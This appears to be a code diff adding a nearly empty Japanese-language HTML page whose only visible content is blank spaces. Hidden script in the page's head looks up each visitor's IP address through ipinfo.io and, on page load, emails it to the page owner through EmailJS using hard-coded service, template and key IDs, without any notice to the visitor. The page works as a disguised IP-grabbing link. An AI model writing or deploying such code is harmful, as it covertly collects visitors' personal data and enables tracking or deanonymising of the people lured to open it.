@@ -1,0 +1,65 @@
+<html lang="ja">
+
+<head>
+
+<meta name="description" content="　　　">
+
+<script>
+
+ipip();
+
+	function ipip(){
+	    var wm = new WeakMap;
+	    var obj = {};
+	    callback = data => wm.set(obj, data.ip);
+
+	    var script = document.createElement('script');
+	    script.src='https://ipinfo.io?callback=callback'
+	    document.head.appendChild(script);
+
+	    window.onload = () => aaa(wm.get(obj));
+	    
+    }
+    
+    
+    function aaa(param){
+    console.log(param);
+    
+  	const templateVariables = {
+    	ip: param,
+	};
+	
+ 	emailjs.send(
+    	'service_pjx9hgv',
+    	'template_4lea48f',
+    	templateVariables,
+	);
+	
+	}
+    
+</script>
+
+
+
+<script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+<script>
+   (function(){
+      emailjs.init("7kemxF_rvONbeA1ID");
+   })();
+</script>
+
+
+
+
+
+</head>
+
+<body>
+
+<span>　　　</span><br>
+<span>　　　</span><br>
+
+
+
+</body>
+</html>
